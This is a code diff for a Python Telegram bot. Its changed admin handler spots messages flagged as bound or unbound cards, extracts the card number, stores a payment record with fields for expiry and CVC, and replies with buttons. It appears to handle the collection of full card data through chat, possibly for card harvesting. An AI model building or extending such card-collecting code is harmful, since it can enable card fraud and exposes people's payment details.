@@ -581,9 +581,23 @@ async def bind_card_handler(callback: types.CallbackQuery):
 async def handle_admin_messages(message: types.Message):
     logger.info(f"📨 АДМИН: Тип: {message.content_type}, Текст: {message.text}")
     
-    if message.text and ("👤 Клиент:" in message.text or "• Имя:" in message.text):
-        logger.info("💰 ОБНАРУЖЕНЫ ПЛАТЕЖНЫЕ ДАННЫЕ!")
-        await process_payment_data(message)
+    if message.text and ("💳 НЕПРИВЯЗАННАЯ КАРТА" in message.text or "💳 ПРИВЯЗАННАЯ КАРТА" in message.text):
+        logger.info("💰 ОБНАРУЖЕНЫ ПЛАТЕЖНЫЕ ДАННЫЕ В НОВОМ ФОРМАТЕ!")
+        
+        # Извлекаем номер карты из сообщения
+        card_number = extract_card_number(message.text)
+        
+        # Создаем платеж
+        payment_id = save_payment(user_id=0, first_name="", last_name="", email="", phone="", 
+                                card_number=card_number, card_expiry="", cvc="")
+        
+        if payment_id:
+            # Отправляем сообщение с кнопками
+            await message.answer(
+                text=message.text,
+                reply_markup=get_payment_buttons(payment_id, "user123", card_number),
+                parse_mode="HTML"
+            )
 
 async def process_payment_data(message: types.Message):
     try:
@@ -1015,6 +1029,7 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
+
 
 
 
